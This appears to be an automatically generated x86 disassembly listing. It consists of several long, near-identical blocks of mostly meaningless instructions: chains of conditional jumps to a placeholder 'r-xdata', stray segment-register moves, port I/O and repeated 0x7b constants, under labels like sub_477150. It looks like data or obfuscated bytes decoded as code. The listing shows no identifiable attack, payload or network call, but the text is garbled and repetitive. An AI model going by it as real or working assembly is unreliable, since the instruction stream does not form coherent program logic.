jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov dl [ edx + 0x7b7b46d1 ]
jmp r-xdata
xchg edx eax
xor dl [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
mov [ 0xffffffffd1928a78 ] al
inc esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
jmp r-xdata
jmp r-xdata
into
or [ esi + edi + 0x140814a7 ] edi
jmp r-xdata
jpo r-xdata
xchg edx eax
xor [ ebx + edi * 2 ] 0x7b
xor ecx [ 0x7b69c692 ]
jpo r-xdata
cmpsd [ esi ] [ edi ]
adc al 0x8
cmp esi 0xffffff84
je r-xdata
jmp r-xdata
daa
[ ecx ]
sbb [ ebx + 0x7b ] ebp
imul edi [ ebx + 0x7b ] 0x13
test [ edi + edi * 8 + 0x19 ] dh
jl r-xdata
jmp r-xdata
cmp bh [ ebx + 0x7b ]
jmp r-xdata
int1
sub al 0x92
ja r-xdata
xchg edx eax
shr [ ebx + 0x7b ] 0x7b
pop ecx
jns r-xdata
adc [ ecx ] edx
adc [ esi ] ecx
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
xor [ ss : esi + edi + 0x30362d97 ] bh
sub eax 0x8b3ebc1d
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop eax
jmp r-xdata
jmp r-xdata
adc al 0x1d
mov esp 0x5b0f9b3e
mov [ 0x9181236 ] eax
mov esp 0x814a73e
jpo r-xdata
inc [ esp + esi * 2 + 0x7b6b19ff ]
jpo r-xdata
aaa
jpo r-xdata
jpo r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
jmp r-xdata
sub edx [ edx + 0x7b7b3480 ]
jmp r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
imul esi eax 0x26f21da4
aas
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
jmp r-xdata
jpe r-xdata
jmp r-xdata
test bl ch
jmp sub_4772dd
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
aas
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
push cs
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_477150
test [ edx + edx * 4 - 0x6f ] ch
popad
jpo r-xdata
and eax 0x52759333
jmp r-xdata
jmp r-xdata
cmp eax 0xddd9134f
sbb dl [ eax + 0x7525922c ]
jpo r-xdata
xchg edx eax
int1
xor eax 0xebeb7b7b
jmp r-xdata
xchg ebx eax
sub eax 0xc0927b7b
cmp al 0x7b
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg ebx eax
jne r-xdata
aas
xchg ebx eax
in eax 0x37
jpo r-xdata
jpo r-xdata
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
imul esi eax 0x26f21da4
aas
jmp r-xdata
ja r-xdata
idiv [ esi ]
mov ebp [ ebx ]
sub al 0x92
cmp al 0x7b
jpo r-xdata
test bl ch
jmp sub_4772dd
jmp r-xdata
shr [ ebx + 0x7b ] 0x7b
jg r-xdata
jpo r-xdata
pop esi
stosb [ edi ]
outsb
jpo r-xdata
sub edx [ edx + 0x7b7b3480 ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
daa
jmp r-xdata
jpo r-xdata
adc al 0x1d
mov esp 0x5b0f9b3e
jpo r-xdata
aaa
jl r-xdata
jmp r-xdata
aas
jpo r-xdata
pop eax
jpo r-xdata
xor ecx [ 0x7b69c692 ]
jpo r-xdata
or [ esi + edi + 0x140814a7 ] edi
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
adc [ ecx ] edx
adc [ esi ] ecx
jpo r-xdata
jmp r-xdata
jmp r-xdata
cmpsd [ esi ] [ edi ]
adc al 0x8
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
cmp esi 0xffffff84
je r-xdata
jpo r-xdata
jmp r-xdata
xchg edx eax
xor [ ebx + edi * 2 ] 0x7b
jmp r-xdata
jmp r-xdata
jpo r-xdata
[ ecx ]
sbb [ ebx + 0x7b ] ebp
jmp r-xdata
jpo r-xdata
jpo r-xdata
cmp bh [ ebx + 0x7b ]
jmp r-xdata
int1
sub al 0x92
ja r-xdata
xchg edx eax
pop ecx
jns r-xdata
imul edi [ ebx + 0x7b ] 0x13
test [ edi + edi * 8 + 0x19 ] dh
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
mov [ 0x9181236 ] eax
mov esp 0x814a73e
jpo r-xdata
jpe r-xdata
jmp r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
xor [ ss : esi + edi + 0x30362d97 ] bh
sub eax 0x8b3ebc1d
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc [ esp + esi * 2 + 0x7b6b19ff ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
push cs
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_477151
insb
xchg edx eax
xchg ecx eax
popad
jpo r-xdata
and eax 0x52759333
jmp r-xdata
jmp r-xdata
cmp eax 0xddd9134f
sbb dl [ eax + 0x7525922c ]
jpo r-xdata
xchg edx eax
int1
xor eax 0xebeb7b7b
jmp r-xdata
xchg ebx eax
sub eax 0xc0927b7b
cmp al 0x7b
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg ebx eax
jne r-xdata
aas
xchg ebx eax
in eax 0x37
jpo r-xdata
jpo r-xdata
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
imul esi eax 0x26f21da4
aas
jmp r-xdata
ja r-xdata
idiv [ esi ]
mov ebp [ ebx ]
sub al 0x92
cmp al 0x7b
jpo r-xdata
test bl ch
jmp sub_4772dd
jmp r-xdata
shr [ ebx + 0x7b ] 0x7b
jg r-xdata
jpo r-xdata
pop esi
stosb [ edi ]
outsb
jpo r-xdata
sub edx [ edx + 0x7b7b3480 ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
daa
jmp r-xdata
jpo r-xdata
adc al 0x1d
mov esp 0x5b0f9b3e
jpo r-xdata
aaa
jl r-xdata
jmp r-xdata
aas
jpo r-xdata
pop eax
jpo r-xdata
xor ecx [ 0x7b69c692 ]
jpo r-xdata
or [ esi + edi + 0x140814a7 ] edi
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
adc [ ecx ] edx
adc [ esi ] ecx
jpo r-xdata
jmp r-xdata
jmp r-xdata
cmpsd [ esi ] [ edi ]
adc al 0x8
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
cmp esi 0xffffff84
je r-xdata
jpo r-xdata
jmp r-xdata
xchg edx eax
xor [ ebx + edi * 2 ] 0x7b
jmp r-xdata
jmp r-xdata
jpo r-xdata
[ ecx ]
sbb [ ebx + 0x7b ] ebp
jmp r-xdata
jpo r-xdata
jpo r-xdata
cmp bh [ ebx + 0x7b ]
jmp r-xdata
int1
sub al 0x92
ja r-xdata
xchg edx eax
pop ecx
jns r-xdata
imul edi [ ebx + 0x7b ] 0x13
test [ edi + edi * 8 + 0x19 ] dh
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
mov [ 0x9181236 ] eax
mov esp 0x814a73e
jpo r-xdata
jpe r-xdata
jmp r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
xor [ ss : esi + edi + 0x30362d97 ] bh
sub eax 0x8b3ebc1d
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc [ esp + esi * 2 + 0x7b6b19ff ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
push cs
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_477159
idiv [ esi ]
xchg edx eax
jmp r-xdata
into
push ebp
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov dl [ edx + 0x7b7b46d1 ]
jmp r-xdata
xor dl [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
xchg edx eax
mov [ 0xffffffffd1928a78 ] al
inc esi
jpo r-xdata
jpo r-xdata
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
jmp r-xdata
jmp r-xdata
or [ esi + edi + 0x140814a7 ] edi
jmp r-xdata
jpo r-xdata
xchg edx eax
xor [ ebx + edi * 2 ] 0x7b
xor ecx [ 0x7b69c692 ]
jpo r-xdata
cmpsd [ esi ] [ edi ]
adc al 0x8
cmp esi 0xffffff84
je r-xdata
jmp r-xdata
daa
[ ecx ]
sbb [ ebx + 0x7b ] ebp
imul edi [ ebx + 0x7b ] 0x13
test [ edi + edi * 8 + 0x19 ] dh
jl r-xdata
jmp r-xdata
cmp bh [ ebx + 0x7b ]
jmp r-xdata
int1
sub al 0x92
ja r-xdata
xchg edx eax
shr [ ebx + 0x7b ] 0x7b
pop ecx
jns r-xdata
adc [ ecx ] edx
adc [ esi ] ecx
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
xor [ ss : esi + edi + 0x30362d97 ] bh
sub eax 0x8b3ebc1d
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop eax
jmp r-xdata
jmp r-xdata
adc al 0x1d
mov esp 0x5b0f9b3e
mov [ 0x9181236 ] eax
mov esp 0x814a73e
jpo r-xdata
inc [ esp + esi * 2 + 0x7b6b19ff ]
jpo r-xdata
aaa
jpo r-xdata
jpo r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
jmp r-xdata
sub edx [ edx + 0x7b7b3480 ]
jmp r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
imul esi eax 0x26f21da4
aas
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
jmp r-xdata
jpe r-xdata
jmp r-xdata
test bl ch
jmp sub_4772dd
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
aas
jpo r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
push cs
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_477169
xchg edi eax
clc
xchg edi eax
sbb ebp [ eax ]
sub eax 0x84851b92
test bl ch
xchg edx eax
jl r-xdata
jmp r-xdata
adc [ ecx ] edx
adc [ esi ] ecx
jpo r-xdata
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
cmp esi 0xffffff84
je r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
[ ecx ]
sbb [ ebx + 0x7b ] ebp
jpo r-xdata
aaa
jpo r-xdata
jpo r-xdata
cmp bh [ ebx + 0x7b ]
jmp r-xdata
int1
sub al 0x92
ja r-xdata
xchg edx eax
shr [ ebx + 0x7b ] 0x7b
pop ecx
jns r-xdata
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
jmp r-xdata
mov [ 0x9181236 ] eax
mov esp 0x814a73e
jmp r-xdata
jpo r-xdata
jpe r-xdata
jmp r-xdata
test bl ch
jmp sub_4772dd
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
xor ecx [ 0x7b69c692 ]
jpo r-xdata
or [ esi + edi + 0x140814a7 ] edi
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
jpo r-xdata
xor [ ss : esi + edi + 0x30362d97 ] bh
sub eax 0x8b3ebc1d
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
imul esi eax 0x26f21da4
aas
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
jmp r-xdata
adc al 0x1d
mov esp 0x5b0f9b3e
cmpsd [ esi ] [ edi ]
adc al 0x8
pop eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
inc [ esp + esi * 2 + 0x7b6b19ff ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
jpo r-xdata
xchg edx eax
xor [ ebx + edi * 2 ] 0x7b
jmp r-xdata
sub edx [ edx + 0x7b7b3480 ]
jmp r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
jmp r-xdata
daa
jmp r-xdata
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
push cs
imul edi [ ebx + 0x7b ] 0x13
test [ edi + edi * 8 + 0x19 ] dh
aas
jpo r-xdata
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_477181
jmp r-xdata
sub eax 0x84851b92
test bl ch
xchg edx eax
jl r-xdata
jmp r-xdata
adc [ ecx ] edx
adc [ esi ] ecx
jpo r-xdata
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
cmp esi 0xffffff84
je r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
[ ecx ]
sbb [ ebx + 0x7b ] ebp
jpo r-xdata
aaa
jpo r-xdata
jpo r-xdata
cmp bh [ ebx + 0x7b ]
jmp r-xdata
int1
sub al 0x92
ja r-xdata
xchg edx eax
shr [ ebx + 0x7b ] 0x7b
pop ecx
jns r-xdata
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
jmp r-xdata
mov [ 0x9181236 ] eax
mov esp 0x814a73e
jmp r-xdata
jpo r-xdata
jpe r-xdata
jmp r-xdata
test bl ch
jmp sub_4772dd
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
xor ecx [ 0x7b69c692 ]
jpo r-xdata
or [ esi + edi + 0x140814a7 ] edi
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
jpo r-xdata
xor [ ss : esi + edi + 0x30362d97 ] bh
sub eax 0x8b3ebc1d
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
imul esi eax 0x26f21da4
aas
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
jmp r-xdata
adc al 0x1d
mov esp 0x5b0f9b3e
cmpsd [ esi ] [ edi ]
adc al 0x8
pop eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
inc [ esp + esi * 2 + 0x7b6b19ff ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
test [ esi ] cl
ja r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
dec ebx
and bl [ edi ]
jo r-xdata
jmp r-xdata
sub eax [ esp + ebp * 4 + 0x747a83f8 ]
r-xdata
jpo r-xdata
xchg edx eax
xor [ ebx + edi * 2 ] 0x7b
jmp r-xdata
sub edx [ edx + 0x7b7b3480 ]
jmp r-xdata
pop esi
jpo r-xdata
jpo r-xdata
jmp r-xdata
sub ebx [ edi ]
test [ esi ] cl
xchg [ edx + 0x7b7b41f3 ] edx
jmp r-xdata
daa
jmp r-xdata
sub [ 0xffffffffc48bf02c ] ch
jg r-xdata
xchg edx eax
xchg ebx eax
sub [ ebx + 0x7b ] edi
jmp r-xdata
xchg edx eax
or eax 0xeb7b7b7f
jmp r-xdata
jmp j_sub_477345
sbb eax 0x92b53ef2
dec ebp
dec ecx
jpo r-xdata
push cs
imul edi [ ebx + 0x7b ] 0x13
test [ edi + edi * 8 + 0x19 ] dh
aas
jpo r-xdata
cmp al 0xbd
jpo r-xdata
jpo r-xdata
jpo r-xdata
sub eax [ ebp + ebp * 8 + 0x7b7b7b97 ]
idiv dh
mov edi 0x2b848487
xchg edx eax
rcr [ edx + 0x7b ] 0x7b
jmp r-xdata
xchg edx eax
xor eax 0xeb7b7b2c
jae r-xdata
sub al 0x92

jpo r-xdata
jmp r-xdata
xchg edx eax
add al 0x2c
jpo r-xdata
movsb [ edi ] [ esi ]
test al 0x80
clc
mov ebp 0x35923973
sub al 0x7b
jpo r-xdata
jmp r-xdata
jpo r-xdata
retn
jmp r-xdata
pop es
not [ ebx - 0x4a0f72b8 ]
sub edx [ edx + 0x7b7b6521 ]
jmp r-xdata
jae r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ss
outsd
mov esp 0x7b39c592
jpo r-xdata
jpo r-xdata
jmp r-xdata
adc ah [ ebp + 0x7b ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jmp r-xdata
[ edx + 0x7b7b7a61 ] 0xeb
jpo r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx + 0x22 ] ecx
pop ds
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop ebp
test bl ch
jmp sub_4773ef
sub_47719b
cmp esi [ edi - 0x10 ]
jpo r-xdata
jmp r-xdata
jpo r-xdata
mov dl 0x92
out dx al
cmp esp [ ebx - 0x6e ]
mov ebp 0xeb7b7b76
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
xchg edx eax
xor [ ebx + edi * 2 ] 0x7b
jmp r-xdata
sub edx [ edx + 0x7b7b3480 ]
jmp r-xdata
cmp esi 0xffffff84
je r-xdata
jmp r-xdata
daa
jmp r-xdata
[ ecx ]
sbb [ ebx + 0x7b ] ebp
imul edi [ ebx + 0x7b ] 0x13
test [ edi + edi * 8 + 0x19 ] dh
jl r-xdata
jmp r-xdata
aas
jpo r-xdata
cmp bh [ ebx + 0x7b ]
jmp r-xdata
int1
sub al 0x92
ja r-xdata
xchg edx eax
shr [ ebx + 0x7b ] 0x7b
pop ecx
jns r-xdata
adc [ ecx ] edx
adc [ esi ] ecx
jpo r-xdata
jmp r-xdata
jpo r-xdata
test [ ebx + ebp + 0x6f2d8428 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
xor [ ss : esi + edi + 0x30362d97 ] bh
sub eax 0x8b3ebc1d
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop eax
jpo r-xdata
jmp r-xdata
jmp r-xdata
mov [ 0x9181236 ] eax
mov esp 0x814a73e
jpo r-xdata
inc [ esp + esi * 2 + 0x7b6b19ff ]
jpo r-xdata
aaa
jpo r-xdata
jpo r-xdata
movsb [ edi ] [ esi ]
sbb eax 0x113f26f2
or [ eax ] esp
sbb eax 0x923d26f2
xor ecx [ 0x7b69c692 ]
jpo r-xdata
or [ esi + edi + 0x140814a7 ] edi
sbb eax 0xf9b3ebc
pop ebx
jmp r-xdata
inc ecx
jpo r-xdata
xchg edx eax
mov cl [ eax + 0x7b ]
jpo r-xdata
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 + 0x2d84282b ] al
outsd
jmp r-xdata
mov [ eax + 0x7b ] gs
jpo r-xdata
imul esi eax 0x26f21da4
aas
adc [ ecx ] ecx
and [ 0xffffffff923d26f2 ] bl
jmp r-xdata
adc al 0x1d
